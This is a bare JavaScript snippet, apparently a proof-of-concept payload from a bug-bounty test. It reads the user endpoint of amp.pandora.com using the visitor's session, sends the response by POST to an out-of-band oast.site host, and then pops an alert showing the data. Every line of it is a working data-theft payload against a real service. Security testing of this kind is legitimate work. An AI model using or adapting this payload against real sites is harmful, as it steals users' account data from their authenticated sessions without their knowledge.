fetch('https://amp.pandora.com/rest/user')
  .then(r => r.text())
  .then(d => {
    fetch('https://vpfdmnwru5f4imv7d815i8idjcj58eqfr.oast.site/', {method:'POST', body:d})
      .then(() => alert('Data sent: ' + d));
    return d;
  })